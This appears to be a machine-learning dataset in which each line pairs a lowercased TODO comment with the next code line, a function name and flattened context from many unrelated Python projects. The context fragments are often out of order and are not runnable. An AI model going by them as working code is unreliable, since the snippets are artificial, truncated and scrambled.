# todo verbosity was mistakenly removed from task_parameters on release 0.11.0, need to bring it back </s> if self.ap.is_a_highest_level_agent:	reset_evaluation_state self.num_successes_across_evaluation_episodes = 0 self.num_evaluation_episodes_completed = 0 screen.log_title("{}: Starting evaluation phase".format(self.name)) elif ending_evaluation:
# todo check if lus can be more than one token </s> if annotations['lu'] in lines[i]:	produce_training_data lines[i].insert(1, str(i)) lines[i].append(annotations['frame']) lines[i].append('B-LU') # IOB-tag else:
# todo: error detection </s> __connect()	serialize_delete def serialize_delete(obj, item): collection = mongodb[obj.collection_type()] collection.remove({'name':item.name})
# todo: i should make sure to escape single quotes here </s> decoded_value = decode_fn(value)	send if safe and self.has_key(key): raise ValueError("Already have key %s" % key) self._cursor.execute(""" INSERT INTO %s
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
except:  # todo: do not use bare except </s> break	getCDXJLinesFromFile try: statusCode = hdrs.statusline.split()[0] if not entry.buffer: return
# todo(brett.cannon) implement </s> pass	test_implicit_hooks def test_implicit_hooks(self):
# todo(b/157460932): migrate to glaziererror </s> terminator.log_and_exit('failed to build the task list',	RunBuild b.Start(out_file=task_list, in_path=root_path) except builder.ConfigBuilderError as e: self._build_info, 4302, e) try:
# todo: test permissions, non-writable fields </s> assert node.category == new_category	test_updating_category_twice_with_same_content_generates_one_log assert node.logs.count() == original_n_logs + 1
# todo check .item() migration </s> for o in outputs:	PtrExtractorRLStop score = PtrExtractorRL.attention_score( attn_feat, query, self._attn_v, self._attn_wq) score[0, o.item()] = -1e18 if self.training:
# todo: implement "n-v.a" form and fix this test </s> self.assertequal(len(result), 0)	test_nsa result = list(subj.get_nsvap_possibilities(forms=hawkey.FORM_NEVRA))
# todo: we really need a "builtin" name ref node to avoid creating a </s> new_node = nodes.cpythonexpressionvariableref(	__call__ decorators = node.getDecorators() if len( decorators ) == 0: variable_name = "staticmethod", source_ref    = node.getSourceReference()
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo test </s> self.unconstrained_effect_repertoire(purview))	effect_info return utils.emd(self.effect_repertoire(mechanism, purview),
# todo: the status should be infeasible here, i think </s> status, values, reducedcosts, shadowprices, slacks = self.readsol(tmpsol)	GUROBI_CMD values = reducedCosts = shadowPrices = slacks = None else: if not self.keepFiles: for f in [tmpSol, tmpMst, tmpLp, "gurobi.log"]:
# todo: support more than just lists </s> self._unify(types.tlist(node.type), node.value.type,	visit_Subscript value=node.value, slice=node.slice, ctx=node.ctx, loc=node.loc) node.loc, node.value.loc, kind='expects') return node
# todo: handle case where entity has never been assigned components </s> with pytest.raises(keyerror):	test_delete_entity assert entity3 == 3 world.delete_entity(3) world.delete_entity(999)
# todo: look this up in one query </s> for user_id in collaborator_ids:	update_playlist collaborator_ids = collaborator_ids.get(playlist.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo: add input option for sample_size </s> input_encoding = input_encoding or default_input_encoding	csv_merge @click.argument("destination") def csv_merge(input_encoding, output_encoding, sources, destination): sample_size = 1024 * 1024 dialects, keys, keys_per_file = {}, [], defaultdict(dict)
# todo(nakago): check why tolerance is high </s> def test_backward_cpu(model_no_dropout, data):	test_backward_cpu atom_data, adj_data, y_grad = data gradient_check.check_backward(
# todo: activate this code if we have limits at webmail level </s> if not self.limiter.hit(self.rate,"client-ip",clientip):	hit def hit(self,clientip): raise RateLimitExceeded()
pass  # todo </s> def test_print_list_with_selector_success(self):	test_print_list_with_selector_success
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_addresses_contents_invalid def test_fail_addresses_contents_invalid(self):
# todo uncomment the actual test below after we have implemented the l1 attack </s> **self.attack_param)	test_adv_example_success_rate_l1 NotImplementedError, self.help_adv_examples_success_rate, ord=1,
# todo: inputs and outputs could be pretty long. these may be worth </s> inputs = dry_run_info["inputs"]	custom_result_renderer dry_run_info = res["dry_run_info"] lines = [fmt_line("location", dry_run_info["pwd_full"])] if inputs: lines.append(fmt_line("expanded inputs", inputs,
# todo: warn </s> return none	get_image_surface_from_uri file_like, mime_type, _charset = urlopen(uri) except IOError: handler = SUPPORTED_FORMATS.get(mime_type, fallback_handler) try:
# todo(jd) move into prepare_service gettextutils and eventlet? </s> eventlet.monkey_patch()	collector def collector(): gettextutils.install('ceilometer') prepare_service(sys.argv)
# todo: can we not reestablish the connection earlier? </s> with pytest.raises(rpcconnectionerror) as exc_info:	test_recover_from_down assert "ECONNREFUSED" in str(exc_info.value) toxiproxy.enable() service_rpc.echo(3) assert "Disconnected while waiting for reply" in str(exc_info.value)
ioloop.current().close()  # never reached. todo: clean shutdown of ioloop </s> ioloop.current().start()	run_worker worker.start()
# hack to support saving/loading pytorch models. todo: improve </s> if hasattr(layer, '_model') and not isinstance(layer._model, model):	to_bytes i = 0 for layer in queue: weights.append(layer.to_bytes()) elif hasattr(layer, u'_mem'):
#todo: mock the socket! </s> try:	test_sessionkeys sessions = {} sut = telnet.telnet(sessions) sut.handle(None, ['192.168.1.200', 51000]) except:
# todo: handle boolean overrides </s> domains={network} if network else none,	ursula else: ursula_config = UrsulaConfiguration.from_configuration_file(filepath=config_file, registry_filepath=registry_filepath, provider_uri=provider_uri,
# todo: hand derive. current value is just a canary to detect changes. </s> np.testing.assert_almost_equal(	test_minute_buy_and_hold self.assertEqual(1, len(algo.portfolio.positions), "Number of positions should stay the same.") 0.050022510129558301, crm.algorithm_returns[-1],
# todo: kickoff syncing process with this peer </s> pass	Node (peer_has_equal_finalized_epoch and peer_has_higher_head_slot) ): await stream.close() async def say_hello(self, peer_id: ID) -> None:
# todo: consider a case where len(url_info_list) > 1. </s> url = port.url_info_list[0].url	_get_port_connected_node_map def _get_port_connected_node_map(port=None): location, others = url.split(':', 1) file_name, address, size = others.split(';')
# store the reason into entry, todo: plugin in the future? </s> if reason:	accept self.accepted.append(entry) self.verbose_details('Accepted %s' % entry['title'], reason) entry['reason'] = reason entry['accepted_by'] = self.current_plugin
# todo(dcramer): we want to be less aggressive on disabling domains </s> cache.set(domain_key, error or '', 300)	fetch_url logger.exception(unicode(exc)) error = ERR_UNKNOWN_INTERNAL_ERROR logger.warning('Disabling sources to %s for %ss', domain, 300, exc_info=True)
# todo(py27): python versions < 3.3 do not support this syntax. </s> yield from batch_gen(file_stream(), batch_size,	iterate_once log.info('queueing data from %s for iterate once', file_name) yield file_name mute_spurious_targets=self.mute_spurious_targets)
# todo: discuss api </s> self.param_distribution = {}  # type: dict[str, distributions.basedistribution]	__init__ self.trials = []  # type: List[trial.Trial]
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo(ultrotter): import/export still to be converted to os api 10 </s> logging.error("import/export still to be converted to os api 10")	ImportOSIntoInstance Returns: False in case of error, True otherwise. return False inst_os = OSFromDisk(instance.os)
# todo extend to nonbinary nodes </s> if i not in self._input_indices and i in self.context.node_indices:	__init__ else: self._dimension_labels.append(None) past_tpm_on = past_tpm_on.sum(i, keepdims=True) / 2 past_tpm_off = past_tpm_off.sum(i, keepdims=True) / 2
# todo: update the entity with program_data? </s> event = dhis2_api.form_to_event(risk_id, form, risk_assessment_event_fields, case['external_id'])	get_payload for cchq_attr, dhis2_attr in RISK_ASSESSMENT_PROGRAM_FIELDS.iteritems()} dhis2_api.enroll_in_id(case['external_id'], risk_id, today, program_data) return json.dumps(event, default=json_serializer) if event else None else:
raise skiptest  #todo: figure out why this randomly started failing. </s> qs = {'a': 1, 'w': 4, 'format': 'json'}	test_discussion_filter_forum def test_discussion_filter_forum(self): forum_vals = ( (1, 4),
# todo add arch arm/aarch/mips/mips64/sparc/sparc64 </s> if arch is none and mode is none and endian is none:	get_arch_mode else: arch, mode, endian = unicorn.UC_ARCH_X86, unicorn.UC_MODE_64, unicorn.UC_MODE_LITTLE_ENDIAN raise Exception("Failed to get architecture parameter from mode") return arch, mode, endian
#todo - return self? </s> raise valueerror("feature references another sequence.")	FeatureLocation def _flip(self, length): if self.ref or self.ref_db: if self.strand == +1: flip_strand = -1
# todo all this for now, until someone fixes the codegen. </s> continue	filter_file_list continue if filename.endswith('.gen.h') or filename.endswith('.gen.cpp'): if filename.startswith('openage/'  ) and filename.endswith('.cpp'): continue
# todo: refactor to remove all references to "set_detection_mapping_mode" from codebase </s> new_mode = "3d" if is_on else "disabled"	detection_enabled_setter def detection_enabled_setter(self, is_on: bool): self.notify_all({"subject": "set_detection_mapping_mode", "mode": new_mode})
# todo: align series </s> return geoseries([s[0].difference(s[1]) for s in zip(self, other)],	difference Operates on either a GeoSeries or a Shapely geometry if isinstance(other, GeoSeries): index=self.index) else:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: give a vanilla example </s> .. math::	mne def mne(predicted_power, df_appliances_ground_truth): error^{(n)} = \\frac
# todo: instead of discarding pending jobs, maintain them </s> for njob in node.pending_jobs:	run_job logger.debug(traceback.format_exc()) if node.pending_jobs: self.finish_job(cluster, njob, DispyJob.Cancelled) if cluster.status_callback and dispy_node:
# todo: then observer.events[0] == trial </s> def test_hyperparams_json_repository_should_be_observable_in_memory():	test_hyperparams_json_repository_should_be_observable_in_memory repo: HyperparamsJSONRepository = HyperparamsJSONRepository()
f.write(self.pastie_content.encode('utf8'))  # todo error checking </s> f = open(directory + os.sep + self.id, 'w')	savePastie raise SystemExit('BUG: Content not set, sannot save')
# todo: allow partial prase complete </s> if shouldeval and prase_input_complete(data):	_ data = data.replace('\r', '\n') shouldeval = data[-1] == "\n" and len(event.current_buffer.document.text_after_cursor) == 0 data = data.rstrip("\n") event.current_buffer.insert_text(data)
# todo add locales </s> raise yunohosterror("no_registrar_set_for_this_dns_zone", dns_zone=dns_zone)	domain_registrar_info registrar_info = _load_registrar_setting(dns_zone) if not registrar_info: logger.info("Registrar name: " + registrar_info['name']) for option_key, option_value in registrar_info['options'].items():
# todo: allow multiple callbacks for each hotkey without overwriting the </s> _hotkeys[hotkey] = _hotkeys[remove_] = _hotkeys[callback] = remove_	add_hotkey del _hotkeys[remove_] del _hotkeys[callback] return remove_
# todo: use pabot options here </s> _copy_screenshots(options)	_report_results_for_one_run def _report_results_for_one_run(outs_dir, options, start_time_string, tests_root_name, stats): output_path = _merge_one_run(outs_dir, options, tests_root_name, stats) _write_stats(stats) if ('report' in options and options['report'] == "NONE" and
# todo(b/123883319) convert to tf.function. </s> if tf.executing_eagerly():	testTrain optimizer=tf.train.AdamOptimizer(learning_rate=0.01)) traj = traj.replace(policy_info=()) train_and_loss = lambda: agent.train(traj) else:
# todo: this is a hack to make a rule know </s> if slot.value == "none" and slot.as_feature():	get_parsing_states for key, slot in tracker.slots.items(): if slot is not None: slot_id = f"slot_{key}_None" state_dict[slot_id] = 1
return deserialize(self.entity_bin, from_bytes=true)  # todo: techdebt fix </s> @entity.setter	Ledger @property def entity(self) -> Any: def entity(self, value: Any) -> None: self.entity_bin = serialize(value, to_bytes=True)  # TODO: techdebt fix
# todo: not implemented yet </s> elif frmt == 'float16':	frmt2float if frmt == 'float32': float_frmt = np.float32 float_frmt = np.float16 if frmt == 'float':
# todo: exp_block_pairs </s> self.assertequal(21, p._pos)	testStatIfElseIfElse self.assertIsNotNone(node)
# @todo: call onaccept if this starts doing anything other than just setting 'master' </s> elif field_type == 7:	dc_question_onaccept field_type = "text", ) field_type = "date" elif field_type == 8:
# todo: create an asynchronous celery task for this </s> :return:	before_update_object :param view_kwargs:
if ursula_accepts:  # todo: read the negotiation results from rest </s> accepted.add(blockchain_arrangement)	make_arrangements arrangement=blockchain_arrangement, network_middleware=network_middleware) else: rejected.add(blockchain_arrangement)
# forward all other methods. todo(l.zou): could use a proxy to automate these </s> return self._grad_op	compute_gradients self._grad_op = self._optimizer.compute_gradients(*args, **kwargs)
# todo: fix string formatting to match python/pandas </s> res = "count    " + str(a_count) + "\n"\	_column_describe_impl q50 = hpat.hiframes_api.quantile(A, .5) q75 = hpat.hiframes_api.quantile(A, .75) "mean     " + str(a_mean) + "\n"\ "std      " + str(a_std) + "\n"\
# todo: we don't support assigning permissions on key value pairs yet </s> return true	user_has_permission def user_has_permission(self, user_db, permission_type):
#todo: make this actually read all </s> os.read(self._r, 1024)	PipePinger return self._r def pongAll (self): def pong (self): os.read(self._r, 1)
# todo explicit inputs to nodes (right now each node is implicitly </s> for non_marginal_node in (node for node in self.network.nodes if	cause_repertoire for node in self.nodes: conditioned_tpm = node.tpm[self._conditioning_indicies(node)] node not in self.purview.nodes): conditioned_tpm = self._marginalize_out(non_marginal_node,
# todo: remove anytime in 2016 </s> _assert(false, "module set but not a valid number!")	get_filtered_data_for_parsed_params _assert(False, "status in filter wasn't set - this isn't expected to be possible") if parsed_params.module is not None and parsed_params.get_module_int() is None: return get_form_details_for_app(domain, parsed_params.app_id, deleted=deleted) elif parsed_params.most_granular_filter == 'xmlns':
# todo: what other exceptions might be returned? </s> return ''	BasePage return self.get(get_redirect=True) except pywikibot.NoPage: @text.setter def text(self, value):
self.binary = serialize(value, to_bytes=true)  # todo: techdebt fix </s> self.obj_name = type(value).__name__	object @object.setter def object(self, value):
# todo(unno): too large and too small axis is deprecated in numpy 1.13 </s> with testing.assert_warns(deprecationwarning):	test_expand_dims_negative2 def test_expand_dims_negative2(self, xp): a = testing.shaped_arange((2, 3), xp) return xp.expand_dims(a, -4)
# todo this should be a return and printed elsewhere </s> print('area under roc curve (auc): %0.2f' % area)	roc_curve fpr, tpr, thresh = skmetrics.roc_curve(true_values, predictions) area = skmetrics.auc(fpr, tpr) d = (fpr - 0) ** 2 + (tpr - 1) ** 2 ind = np.where(d == np.min(d))[0]
# todo: does not find everything it should when contentproxy content </s> instance.get_descendants(include_self=true).update(_ct_inventory=none)	tree_post_save_handler Clobber the _ct_inventory attribute of this object and all sub-objects on save.
# todo(rosmaita): bug #1745003 </s> self.assertequal('shared_id', rows[3]['id'])	TestOcataMigrate01Mixin self.assertEqual('public_id', rows[2]['id'])
# todo fetch a real object </s> return loc_code	location_from_code def location_from_code(loc_code):
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo: may be check whether it fits to tracking branch </s> raise valueerror("refspec specified without a remote. (%s)" %	fetch if remote is None: if refspec is not None: refspec) if all:
# drl_todo: this is the opposite of what i would expect </s> reverse = false	search sort_by_list.append(order_by[1:]) if len(sort_by_list) == 1: else: sort_by_list.append(order_by)
## todo : log error </s> (title, body) = \	_add_function_to_submission except InvenioWebSubmitAdminWarningInsertFailed, e: user_msg.append(str(e)) _create_configure_doctype_submission_functions_form(doctype=doctype, action=action, user_msg=user_msg) return (title, body)
# todo: exc_info. </s> future.set_exception(error)	_connected_callback def _connected_callback(self, future, result, error): if error: elif not self._get_member(): future.set_exception(pymongo.errors.AutoReconnect(
# todo: check error location </s> assert result.data == {'nest': {'test': none}}	test_nullable_list_of_non_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.' check(type, None, {'nest': {'test': None}})
# todo: handle marker? </s> return [mapping['uuid'] for mapping in maps]	get_event_source_mapping_ids maps = conn.list_event_source_mappings(EventSourceArn=eventsourcearn, FunctionName=functionname)['EventSourceMappings'] except ClientError as e: return {'error': salt.utils.boto.get_error(e)}
# todo(kenta oono) </s> for i in six.moves.range(label_num):	forward recall = xp.empty((label_num), dtype=y.dtype) support = xp.empty((label_num), dtype=numpy.int32) supp = (t == i) & (t != self.ignore_label) relevant = (pred == i) & (t != self.ignore_label)
#   todo: doing this for the last len(x) terms should be enough </s> self.xi = np.concatenate((self.xi, x))	lfilter_zi logger.warning("len(zi) > len(b) - 1, zi was truncated") y_q = xb_q = np.zeros(len(x)) for k in range(len(x)): xb_q = self.Q_mul.fixp(
# todo remove? </s> user_stmt = self._parser.user_stmt()	_get_under_cursor_stmt if not isinstance(stmt, (pr.ExprStmt, pr.KeywordStatement)): raise NotFoundError() if user_stmt is None: pos = self._pos
# todo: compute the average cost of these feature relative to hash feature </s> return 2	get_node_cost elif isinstance(node, (capa.features.common.Substring, capa.features.common.Regex)): elif isinstance(node, (ceng.Not, ceng.Range)): return get_node_cost(node.child)
if self._ndim == 3: # todo: use hasz </s> lgeos.geoscoordseq_getz(self._cseq, i, byref(dz))	__getitem__ lgeos.GEOSCoordSeq_getX(self._cseq, i, byref(dx)) lgeos.GEOSCoordSeq_getY(self._cseq, i, byref(dy)) return (dx.value, dy.value, dz.value) else:
# todo switch to transform </s> return window(self.affine, left, bottom, right, top,	window def window(self, left, bottom, right, top, boundless=False): height=self.height, width=self.width, boundless=boundless)
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = 'unable to parse the following line(s):<br/>{}'.format(	enrich_json_with_data ) if ann_obj.failed_lines: '\n<br/>\n'.join( ['{}: {}'.format(
# todo: make this cache preparation configurable </s> return _carefully_strip_whitespace(content)	_handle_tag def _handle_tag(): content = caller()
# todo: httpok is only handled by the httpexceptions </s> response.redirect(exc)	publish_module response._unauthorized() except HTTPRedirection as exc: status, headers = response.finalize() start_response(status, headers)
# todo: instead of arrays, vbos should be used here, as a large part of </s> gl.glvertexpointerd(self.vertices)	glDraw if self.vertices.size == 0 or self.colors.size == 0: return GL.glColorPointerd(self.colors) GL.glEnableClientState(GL.GL_VERTEX_ARRAY)
#todo: this is just for backwards compatibility. it should be removed in v0.98 with p2.6 </s> formatters = cls._create_formatters(cp)	configFromFile formatters = logging.config._create_formatters(cp) except: logging._acquireLock() try:
# todo change to test models separated from ralph </s> permission_admin.model = datacenterasset()	test_get_list_display 'sn', 'hostname', 'invoice_date', 'invoice_no', ] self.assertListEqual( ['barcode', 'sn'],
# todo(b/182316162): unify publisher handing so that post-execution artifact </s> outputs_utils.tag_output_artifacts_with_version(task.output_artifacts)	_publish_execution_results _update_state(result.status) return publish_params = dict(output_artifacts=task.output_artifacts) if result.output_artifacts is not None:
'scoped': false,  # todo </s> 'type': 'open' if group.is_public else 'private'  # todo	_model 'id': group.pubid, 'public': group.is_public, } model = self._inject_urls(group, model)
# todo: serialize properly </s> return self.ok(importers)	RepoImporters try: importers = importer_manager.get_importers(repo_id) except errors.MissingImporter: serialized = http_error_obj(404)
# todo: for now we dependend on the timestamp to be </s> evt.timestamp = 0	_ParseDatabase for evt in evt_gen: if evt.timestamp < 0: evt.query = query if not hasattr(evt, 'offset'):
# todo: read the email sender and recipient from configs. </s> email_sender = 'foo@baz.com'	_send_email Returns: None email_recipient = 'bar@baz.com' email_subject = 'Inventory loading {0}: {1}'.format(cycle_timestamp, status)
# todo: implement textures properly </s> pass	makeMaterial mat.ambient = 1 if texture is not None: return mat
""" todo: documentation </s> raise notimplementederror('generatingcommand.generate(self, records)')	generate def generate(self):
# todo: change to appropriate 'clone' method </s> leaf_model = self.leaf_model.__class__(**self.leaf_model._get_params())	_new_learning_node else: depth = 0 if is_active: new_ada_leaf = AdaActiveLearningNodeRegressor(
# todo: message depending on narrowing/float-conversion </s> msg = 'implicit conversion from {} to {} (narrowing)'	write_trace buf = np.asarray(buf) if buf.dtype != dtype: warnings.warn(msg.format(buf.dtype, dtype), RuntimeWarning) xs = np.asarray(buf, order = 'C', dtype = dtype)
# todo remove these in enaml version 0.8.0 </s> super(dockpane, self)._update_proxy(change)	_update_proxy def _update_proxy(self, change):
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
# todo: update once lakshmi's pr is merged </s> packs_base_path = '/opt/stackstorm'	get_sandbox_python_binary_path :param pack: Pack name. :type pack: ``str`` virtualenv_path = os.path.join(packs_base_path, 'virtualenvs/', pack) if pack in SYSTEM_PACK_NAMES:
# todo: sinpi </s> return pi / (math.sin(pi*x)*_gamma_real(1-x))	_gamma_real return _exact_gamma[_intx] if x < 0.5: else: x -= 1.0
# todo: add at least reflection tests before adding notimplemented version </s> def prioid(context, *args):	prioid *musicpd.org, current playlist section:* ``prioid {PRIORITY} {ID...}``
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo: progress +kwargs </s> else:	pull GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): remote.pull(refspec=refspec, progress=progress) remote.pull(refspec=refspec, progress=progress)
# todo: different codec to be used </s> raise (	__to_coer_ws_buf Cont = self._get_val_obj(self._val[0]) if Cont == self._const_cont and self._const_cont_enc is not None: ASN1NotSuppErr('{0}: specific CONTAINING encoder unhandled' \ .format(self.fullname())))
# todo: the stuff </s> log.debug('flushing simple persistence updates to db.')	flush def flush(self):
# todo: implement </s> return true	can_lock def can_lock(self, item, user):
pass # todo </s> def try_redo(self, *args):	try_redo
#todo: test size=var, with shape that change from call to call </s> if mode in ['debug_mode','fast_compile']:	test_uniform def test_uniform(): sample_size = (10,100) steps = int(1e2)
# todo - this isn't actually the correct way to set the vary header, </s> response.headers['allow'] = ', '.join(self.allowed_methods)	dispatch except ErrorResponse, exc: response = exc.response response.headers['Vary'] = 'Authenticate, Accept' return self.emit(response)
# todo: use unshare() here </s> quiet_call(	Filesystem self.mpoint = st.enter_context( tempfile.TemporaryDirectory(suffix='.privmnt')) ['mount', '-t', self.vfstype, '-o', 'noatime,noexec,nodev', '-n', '--', self.device.devpath, self.mpoint])
# todo(unno): numpy.matrix is used for scipy.sparse though </s> out = xp.asmatrix(out)	test_sum_with_out out = xp.empty(shape, dtype=self.ret_dtype) if xp is numpy: return m.sum(axis=self.axis, dtype=self.ret_dtype, out=out)
# todo: check if this logic is sufficient </s> inc.extend(set(bottom.kinfo.kernel._include_dirs +	extruded_horizontal_facet c = exp.coefficients()[cindex] clist.extend(coeff_map(c)) top.kinfo.kernel._include_dirs)) tensor = eigen_tensor(exp, t, index)
#todo: implement check_equals </s> columns_ic = indexcorrespondence.from_correspondence(self._columns, columns)	reindex columns = index_from_optional_constructor(columns, default_constructor=self._COLUMNS_CONSTRUCTOR) own_columns_frame = True else:
# todo(rbharath, enf): figure out why pi_stack is slow and cation_pi </s> voxel_feature_types=["ecfp", "splif", "hbond", "salt_bridge"],	__init__ self.featurizer = GridFeaturizer( voxel_width=16.0, feature_types="voxel_combined", ecfp_power=9, splif_power=9, parallel=True, flatten=True)
pass # todo </s> def handle_request(self, input):	handle_request
# todo action required that updates the endpoint </s> endpoints = []	remove def remove(self, args): eps = self._get_endpoints(args, 0) for endpoint in eps:
# todo username </s> sudo = args.pushy('ssh+sudo:{hostname}'.format(hostname=hostname))	uninstall for hostname in args.host: log.debug('Detecting platform for host %s ...', hostname) lsb_release_r = sudo.compile(lsb_release) (distro, codename) = lsb_release_r()
# todo: remove this function </s> logger.warning((	__getattr__ def __getattr__(self, key): DEPRECATED: please use ``Inventory.get_group`` instead. 'Use of Inventory.<group_name> is deprecated, ' 'please use `Inventory.get_group` instead.'
#todo: can't initialize these values in the __init__? </s> self.done       = false	run def run(self): try: self.sockets    = [] self.addresses  = {'sync_address'           : "tcp://127.0.0.1:{port}".format(port=10100),
# todo: this check is to maintain backwards compatibility with the old way of creating </s> if hasattr(self, 'package_form'):	new vars = {'data': data, 'errors': errors, 'error_summary': error_summary} self._setup_template_variables(context, {'id': id}) c.form = render(self.package_form, extra_vars=vars) else:
# todo: this doesn't seem necessary; test passes without it </s> time.sleep(1)	test_watch_dir watcher.watch(tmpdir) assert watcher.is_changed(tmpdir) is False filepath = os.path.join(tmpdir, 'foo') with open(filepath, 'w') as f:
# todo(pvp): this and other input_ids i tried for generation give pretty bad results. not sure why. model might just not be made for auto-regressive inference </s> output_ids = model.generate(input_ids)	test_lm_generate_xlm_mlm_en_2048 447, ]  # the president the president the president the president the president the president the president the president the president the president self.assertListEqual(output_ids[0].tolist(), expected_output_ids, do_sample=False)
# todo: better error reporting </s> logging.warning("can't execute ndisc6, please install if missing")	ActivateMasterIp utils.RunCmd(["ndisc6", "-q", "-r 3", master_ip, master_netdev]) except errors.OpExecError: if err_msg: _Fail(err_msg)
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: use flask logger without it triggering the root </s> __name__: {	init_logging }, "loggers": { "handlers": [], "level": os.getenv("ORCHEST_LOG_LEVEL", "INFO"),
# todo: refactor </s> aggregrate = {}	_execute_module ) else: all_comm_ok = True all_changed = False
# todo: refactor </s> @staticmethod	cpf def cpf(with_mask=True): Get a random CPF (brazilian social security code)
# todo: remove "get_" from the name </s> return the type of the node	get_node_type def get_node_type(self, node, index=False): Args: node: The node ID from the original graph
# domain=domain,  # todo: why isn't domain being saved on commcarecaseindexsql objects? </s> referenced_id__in=case_ids	get_all_reverse_indices_info def get_all_reverse_indices_info(domain, case_ids): query = CommCareCaseIndexSQL.objects.filter( ) return [
raise exceptions.mpdnotimplemented  # todo </s> .. versionadded:: mpd protocol 0.19	unmount unmount foo
# todo include results from results.albums(), etc. too </s> playlist = playlist(tracks=[	callback logger.debug(u'In search callback, translating search results') logger.debug(results.tracks()) self.translate.to_mopidy_track(t) for t in results.tracks()])
# todo: this is incomplete. </s> elif page_is_empty and new_position_y > max_position_y:	block_container_layout is_page_break = True break new_position_y -= box.margin_top line.translate(0, -box.margin_top)
# todo implement. </s> pass	SingleTrainerWorker self.label_column = label_col def train(self, iterator):
# todo come up with a better error reporting mechanism so that we don't need this as a special case. </s> if isinstance(state.exc, resolveerror):	_assert_type_is_return if type(state) is Return: return raise AddressLookupError(str(state.exc)) else:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_inputs_not_needed def test_pass_inputs_not_needed(self): Preparing a bundle that does not transfer any IOTAs.
# todo only ubuntu 12.04 is supported right now </s> if (distro != 'ubuntu'	uninstall lsb_release_r = sudo.compile(lsb_release) (distro, codename) = lsb_release_r() or codename != 'precise'): raise exc.UnsupportedPlatform(distro=distro, codename=codename)
# todo(amotoki): due to neutron bug 1378525, neutron disables </s> self.ha_allowed = false	__init__ ('distributed', _('Distributed'))] self.fields['mode'].choices = mode_choices if not self.ha_allowed: del self.fields['ha']
# todo:check the note in docstring. change that behavior to return the joint map </s> if not variables:	map_query >>> belief_propagation.map_query(variables=['J', 'Q'], ...                              evidence={'A': 0, 'R': 0, 'G': 0, 'L': 1}) variables = set(self.variables) final_distribution = self._query(variables=variables, operation='marginalize', evidence=evidence)
# todo: remove when support for django 1.4 is dropped </s> return getattr(model._meta, 'concrete_model', model._meta.proxy_for_model)	get_concrete_model property so we try to fetch the `concrete_model` from the opts and fallback to `proxy_for_model` if it's not defined.
#todo handle partial datetime values </s> if  datetime.datetime(*item[field][:7]) > datetime.datetime.strptime(value, date_format):	_rulepass return True if op == "after": return True if op == "before":
#todo - once we drop support for python 2.3, this helper function can be </s> return _iterate_via_alignio(handle, format)	parse return iterator_generator(handle) elif format in AlignIO._FormatToIterator : else : raise ValueError("Unknown format '%s'" % format)
# todo: support domain-specific settings </s> global_backends = getattr(settings, 'sms_backends', {})	auto_load Get the appropriate outbound SMS backend to send to a particular phone_number backend_mapping = sorted(global_backends.iteritems(), key=lambda (prefix, backend): len(prefix),
### todo: code this! </s> pass	_handle_select_tag_outside_form def _handle_select_tag_outside_form(self, tag, attrs):
# todo: speed up </s> v0 = vector((posa[i0 * 3 + 0], posa[i0 * 3 + 1], posa[i0 * 3 + 2]))	ExportGeometry i1 = ia[i * 3 + 1] i2 = ia[i * 3 + 2] v1 = Vector((posa[i1 * 3 + 0], posa[i1 * 3 + 1], posa[i1 * 3 + 2])) v2 = Vector((posa[i2 * 3 + 0], posa[i2 * 3 + 1], posa[i2 * 3 + 2]))
# todo: clean up </s> yield _pubsubs_gsub	pubsubs_fsub _pubsubs_gsub = _make_pubsubs(hosts, floodsubs)
# todo(yanase): remove number from system_attrs after adding trialmodel.number. </s> assert trials[0].system_attrs == {'number': 0}	test_create_new_trial_id assert trials[0].state == TrialState.RUNNING assert trials[0].user_attrs == {}
# todo(nateh): fix for arch's multi-file net config </s> return ['all']	_write_network util.write_file(self.network_conf_fn, settings)
# todo check error message </s> assert app_is_not_installed(secondary_domain, "legacy_app")	test_legacy_app_failed_install with pytest.raises(YunohostError): install_legacy_app(secondary_domain, "/legacy")
# todo: handle multiple credentials (username/password pairs). </s> req=srv.createauthpacket(code=pyrad.packet.accessrequest,	authenticate_using_radius_server dict=Dictionary(os.path.join(root_dir, "extras", "pyrad_dicts", "dictionary"), os.path.join(root_dir, "extras", "pyrad_dicts", "dictionary.acc"))) User_Name=credentials['user'][0], NAS_Identifier="localhost")
